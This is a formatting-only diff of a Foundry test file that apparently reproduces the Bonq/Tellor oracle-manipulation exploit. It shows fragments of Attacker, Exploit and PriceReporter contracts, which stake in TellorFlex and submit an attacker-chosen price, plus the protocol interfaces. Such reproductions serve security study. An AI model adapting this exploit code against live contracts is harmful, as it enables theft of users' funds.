@@ -45,6 +45,7 @@ import "./../interface.sol";
 // PR welcome!
 
 contract Attacker is Test {
+
     IERC20 constant TRB = IERC20(0xE3322702BEdaaEd36CdDAb233360B939775ae5f1);
     IERC20 constant WALBT = IERC20(0x35b2ECE5B1eD6a7a99b83508F8ceEAB8661E0632);
     IERC20 constant BEUR = IERC20(0x338Eb4d394a4327E5dB80d08628fa56EA2FD4B81);
@@ -100,9 +101,11 @@ contract Attacker is Test {
         // Print ALBT exploit result
         emit log_named_decimal_uint("[result] wALBT balance in Exploit contract", WALBT.balanceOf(address(exploit)), 18);
     }
+
 }
 
 contract Exploit is Test {
+
     ITellorFlex constant TellorFlex = ITellorFlex(0x8f55D884CAD66B79e1a131f6bCB0e66f4fD84d5B);
     IOriginalTroveFactory constant BonqProxy = IOriginalTroveFactory(0x3bB7fFD08f46620beA3a9Ae7F096cF2b213768B3);
     IERC20 constant TRB = IERC20(0xE3322702BEdaaEd36CdDAb233360B939775ae5f1);
@@ -181,17 +184,21 @@ contract Exploit is Test {
         TellorFlex.depositStake(_tokenId);
         TellorFlex.submitValue(queryId, price, 0, queryData);
     }
+
 }
 
 contract PriceReporter is Test {
+
     function updatePrice(uint256 _tokenId, uint256 _price) public {
         (bool suc,) = msg.sender.delegatecall(abi.encodeWithSignature("updatePrice(uint256,uint256)", _tokenId, _price));
         require(suc, "Update price failed");
     }
+
 }
 
 /*---------- Interface ----------*/
 interface ITellorFlex {
+
     event NewReport(
         bytes32 indexed _queryId,
         uint256 indexed _time,
@@ -272,9 +279,11 @@ interface ITellorFlex {
     function updateStakeAmount() external;
     function verify() external pure returns (uint256);
     function withdrawStake() external;
+
 }
 
 interface IOriginalTroveFactory {
+
     event AdminChanged(address previousAdmin, address newAdmin);
     event BeaconUpgraded(address indexed beacon);
     event CollateralUpdate(address token, uint256 totalCollateral);
@@ -400,9 +409,11 @@ interface IOriginalTroveFactory {
     function updateTotalDebt(uint256 _amount, bool _borrow) external;
     function upgradeTo(address newImplementation) external;
     function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
+
 }
 
 interface ITrove {
+
     event Liquidated(address trove, uint256 debt, uint256 collateral);
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
     event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);
@@ -460,4 +471,5 @@ interface ITrove {
     function transferToken(address _token, address _recipient) external;
     function unclaimedArbitrageReward() external view returns (uint256);
     function unclaimedCollateralRewardAndDebt() external view returns (uint256, uint256);
+
 }
